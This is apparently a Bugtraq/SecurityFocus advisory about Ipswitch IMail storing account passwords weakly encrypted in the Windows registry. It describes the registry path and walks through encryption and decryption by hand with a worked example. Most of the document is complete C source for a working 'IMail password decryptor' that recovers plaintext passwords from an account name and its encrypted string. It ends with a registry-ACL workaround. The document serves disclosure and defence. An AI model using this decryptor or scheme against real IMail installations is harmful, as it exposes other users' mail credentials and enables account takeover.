source: http://www.securityfocus.com/bid/880/info

IMail keeps the encrypted passwords for email accounts in a registry key, HKLM\SOFTWARE\Ipswitch\Imail\Domains\(DomainName)\Users\(UserName), in a string value called "Password". The encryption scheme used is weak and has been broken. The following description of the mechanism used is quoted from Matt Conover's post to Bugtraq, linked to in full in the Credits section.

ENCRYPTION SCHEME Take the lowercase of the account name, split it up by letter and convert each letter to its ASCII equivalent. Next, find the difference between each letter and the first letter. Take each letter of the password, find it's ASCII equivalent and add the offset (ASCII value of first char of the account name minus 97) then subtract the corresponding difference. Use the differences recursively if the password length is greater than the length of the account name. This gives you the character's new ASCII value. Next, Look it up the new ASCII value in the ASCII-ENCRYPTED table (see http://www.w00w00.org/imail_map.txt) and you now have the encrypted letter.

Example:

Account Name: mike
m = 109
i = 105
k = 107
e = 101

Differences:
First - First: 0
First - Second: 4
First - Third: 2
First - Fourth: 8

Unencrypted Password: rocks
r = 114
o = 111
c = 99
k = 107
s = 115

(ASCII value + offset) - difference:
offset: (109 - 97) = 12
(114 + 12) - 0 = 126
(111 + 12) - 4 = 119
(99 + 12) - 2 = 109
(107 + 12) - 8 = 111
(115 + 12) - 0 = 127

126 = DF
119 = D8
109 = CE
111 = D0
127 = E0


Encrypted Password: DFD8CED0E0

The decryption scheme is a little easier. First, like the encryption scheme, take the account name, split it up by letter and convert each letter to its ASCII equivalent. Next, find the difference between each letter and the first letter. Now split the encrypted password by two characters (e.g., EFDE = EF DE) then look up their ASCII equivalent within the ASCII-ENCRYPTED table (see http://www.w00w00.org/imail_map.txt). Take that ASCII value and add the corresponding difference.Look this value up in the ascii table. This table is made by taking the ASCII value of the first character of the account name and setting it equal to 'a'.

EXAMPLE

Account Name: mike
m = 109
i = 105
k = 107
e = 101

Differences:
First - First: 0
First - Second: 4
First - Third: 2
First - Fourth: 8

Encrypted Password: DFD8CED0E0
DF = 126
D8 = 119
CE = 109
D0 = 111
E0 = 127

Add Difference:

126 + 0 = 126
119 + 4 = 123
109 + 2 = 111
111 + 8 = 119
127 + 0 = 127

Look up in table (see http://www.w00w00.org/imail_map.txt):
126 = r
123 = o
111 = c
119 = k
127 = s
Unencrypted Password: rocks 

/*
 * IMail password decryptor
 * By: Mike Davis (mike@eEye.com)
 *
 * Thanks to Marc and Jason for testing and their general eliteness.
 * Usage: imaildec <account name> <encrypted password>
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <memory.h>

void usage (char *);
int search (char *);
int eql (char *, char *);
int lc (int);
int strlen();

struct
{
  char *string;
  int o;
} hashtable[255];

struct { char *string; } encrypted[60];

char *list = "0123456789ABCDEF";

int alpha[95] = {
  32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
  50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67,
  68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85,
  86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102,
  103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116,
  117, 118, 119, 120, 121, 122, 123, 124, 125, 126 
};

int
main (int argc, char *argv[])
{
  int i, j, k, ascii, start, diffs[66], num, loop;
  char asciic[155];

  if (argc <= 2 || argc > 3) usage (argv[0]);
  if (strlen (argv[2]) > 62)
  {
     printf ("\nERROR: Please enter an encrypted password less than 60 "
             "characters.\n\n");

     usage (argv[0]);
  }

  printf ("IMail password decryptor\nBy: Mike <Mike@eEye.com>\n\n");

  ascii = -97;

  /* Make the hash table we will need to refer to. */
  for (i = 0, start = 0; i < strlen (list); i++)
  {
     for (k = 0; k < strlen (list); k++)
     {
        hashtable[start].string = (char *) malloc (3);
        sprintf (hashtable[start].string, "%c%c", list[i], list[k]);
        hashtable[start].o = ascii++;

        /* Don't want to skip one! */
        if ((k + 1) != strlen (list)) start++;
     }

     start++;
  }

  for (k = 0, start = 0; k < strlen (argv[1]); k += strlen (argv[1]))
  {
     for (j = k; j < k + strlen (argv[2]); j += 2, start++)
     {
        encrypted[start].string = (char *) malloc (3);
        sprintf (encrypted[start].string, "%c%c", argv[2][j],
                 argv[2][j + 1]);
     }
  }

  for (j = 0, start = 0; j < strlen(argv[2]) / strlen(argv[1]); j++)
     for (i = 0; i < strlen (argv[1]); i++, start++)
        diffs[start] = (lc(argv[1][0]) - lc(argv[1][i]));

  printf ("Account Name: %s\n", argv[1]);

  printf ("Encrypted: ");
  for (i = 0; i < strlen (argv[2]) / 2; i++) printf ("%s", encrypted[i]);
  putchar('\n');

  printf ("Unencrypted: ");
  for (i = 0, loop = 0; i < strlen (argv[2]) / 2; i++, loop++)
  {
     num = search (encrypted[i].string) + diffs[i];
     if (loop == 0)
     {
        /* Make alphabet */
        for (j = lc (argv[1][0]) - 65, start = 0;
             j <= lc (argv[1][0]) + 29;
             j++, start++)
        {
           asciic[j] = alpha[start];
        }
     }

     putchar(asciic[num]);
  }

  putchar('\n');
  return 0;
}

int
search (char *term)
{
  register int n;

  for (n = 0; n < 255; n++)
     if (hashtable[n].string && eql (hashtable[n].string, term))
        return hashtable[n].o;

  return 0;
}

int
eql (char *first, char *second)
{
  register int i;
  for (i = 0; first[i] && (first[i] == second[i]); i++);

  return (first[i] == second[i]);
}

int
lc (int letter)
{
  if (letter >= 'A' && letter <= 'Z') return letter + 'a' - 'A';
  else return letter;
}

void
usage (char *name)
{

  printf ("IMail password decryptor\n");
  printf ("By: Mike (Mike@eEye.com)\n\n");
  printf ("Usage: %s <account name> <encrypted string>\n", name);
  printf ("E.g., %s crypto CCE5DFE5E2\n", name);
  exit (0);
}

---------------------------------------------------------------------------
Patch:

Ipswitch was notified of this advisory last week, and they have not
responded.  They released a never version afterwards, but we cannot
confirm whether or not this latest version, 6.01 fixes the vulnerability.
Their site says:
  This patch fixes problems with POP server and IAdmin application,
  including external database authentication problems and possible
  password corruption problems.

Until we have positive confirmation, you can set an ACL on each registry
key containing the password to prevent normal users (while still allowing
IMail) from viewing other users' passwords.  You are safe to remove read
permissions on these registry keys--they will not affect IMail (as it
doesn't run with user privileges).

---------------------------------------------------------------------------
People that deserve hellos: eEye, USSR, and Interrupt

w00sites:
http://www.attrition.org
http://www.eEye.com
http://www.ussrback.com


